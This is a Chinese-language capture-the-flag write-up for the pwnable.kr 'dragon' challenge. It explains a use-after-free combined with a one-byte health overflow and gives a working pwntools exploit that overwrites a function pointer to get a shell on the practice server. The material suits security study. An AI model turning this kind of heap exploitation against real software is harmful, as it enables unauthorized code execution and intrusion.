# Pwnable-Kr-Rookiss

### dragon

>I made a RPG game for my little brother.
>But to trick him, I made it impossible to win.
>I hope he doesn't get too angry with me :P!
>
>Author : rookiss
>Download : http://pwnable.kr/bin/dragon
>
>Running at : nc pwnable.kr 9004
>
>On Aug 1,2018

UAF的一道「简单题」，但我不会。。。pwn做的太少了

#### 简要分析

简单说一下为什么会有UAF漏洞，程序在`FightDragon`函数里声明了两个结构体`ptr`和`v5`，大小均为`0x10`，分别代表dragon和player。由于在`attack`函数中player的指针不论是失败或是胜利都会被free，但是这个指针并没有指向NULL，导致下一次malloc相同大小的空间时会分配到同一地址，当我们把修改这次的内容时实际上覆盖了player的内容，所以可以在这里「搞事情」。

用IDA看伪代码的时候觉得这肯定不用打赢龙的，于是一直在找「外围」的函数的利用点，但没找到什么有用的。之后看了别人的wp后发现是可以打赢龙的，并且非赢不可。

之所以能够打赢龙是因为「龙的血量」的数据大小是1个字节，即最大127，当更大时造成溢出变成负值，这时符合胜利条件。

之所以非赢不可是因为胜利之后会进入如下代码块

```c
  if ( v3 )
  {
    puts("Well Done Hero! You Killed The Dragon!");
    puts("The World Will Remember You As:");
    v2 = malloc(0x10u);
    __isoc99_scanf("%16s", v2);
    puts("And The Dragon You Have Defeated Was Called:");
    ((void (__cdecl *)(_DWORD *))*v5)(v5);
  }
```

这里的`v2`分配的大小是`0x10`，和上面的结构体大小相同，于是`v2`的地址和`player`的地址相同，这时我们可以把`system('/bin/sh')`的地址输入，在最后一行调用的时候就相当于`getshell`了:-)

#### exp

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'L1B0'

from pwn import *
import sys
context.log_level = 'debug'

if sys.argv[1] == 'loc':
	io = process('./dragon')
else:
	io = remote('pwnable.kr',9004)

sys_addr = 0x08048DBF

def playGame():
	
	for i in range(4):
		io.sendline('1')
	for i in range(4):
		io.sendline('3\n3\n2\n')
	io.sendline(p32(sys_addr))

if __name__ == "__main__":
	
	playGame()
	io.interactive()
```



